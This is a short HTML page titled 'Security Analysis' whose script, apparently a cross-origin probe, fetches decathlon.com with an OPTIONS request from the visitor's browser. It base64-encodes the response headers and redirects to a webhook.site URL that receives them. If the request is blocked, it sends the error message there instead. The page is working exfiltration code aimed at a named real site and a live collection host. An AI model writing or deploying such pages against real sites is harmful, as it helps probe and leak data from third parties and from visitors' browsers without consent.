<!DOCTYPE html>
<html>
<body>
    <h1>Security Analysis...</h1>
    <script>
        var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
        
        // محاولة بسيطة لقراءة الهيدرز فقط
        fetch('https://www.decathlon.com/', { method: 'OPTIONS' })
        .then(res => {
            var headers = "";
            res.headers.forEach((v, k) => { headers += k + ": " + v + " | "; });
            window.location.href = webhook + "?headers=" + btoa(headers);
        })
        .catch(err => {
            // إذا تبلوكا، غانصيفطو نوع الخطأ بالتفصيل
            window.location.href = webhook + "?debug=" + btoa(err.message);
        });
    </script>
</body>
</html>
